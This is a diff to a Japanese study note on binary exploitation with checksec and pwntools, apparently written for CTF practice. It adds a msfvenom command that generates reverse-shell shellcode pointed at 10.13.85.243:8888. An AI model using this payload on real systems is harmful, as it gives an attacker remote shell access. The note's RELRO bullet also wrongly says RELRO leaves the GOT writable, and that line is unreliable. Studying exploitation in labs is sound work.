@@ -17,7 +17,7 @@ kali の場合、pwn と打ってインストールされていなければイ�
 checksec --file <file>
 ```
 
-- RELRO: RELROがあれば、GOTが読み取り、書き込み可能
+- RELRO: RELRO があれば、GOT が読み取り、書き込み可能
 - Stack: canary が有効かどうか
 - NX: 有効ならスタックのコード実行（シェルコード挿入）ができない
 - PIE: ASLR（アドレス空間のランダム化）が有効かどうか
@@ -88,6 +88,12 @@ proc.send(payload)
 
 # シェルと通信するためインタラクティブが必要
 proc.interactive()
+```
+
+（参考）msfvenom によるシェルコード生成。pwn を使わず標準入力から流し込む場合に役立つ。
+
+```sh
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.85.243 LPORT=8888 -b '\x00' -f python
 ```
 
 （参考）ASLR（アドレス空間配置のランダム化）無効化
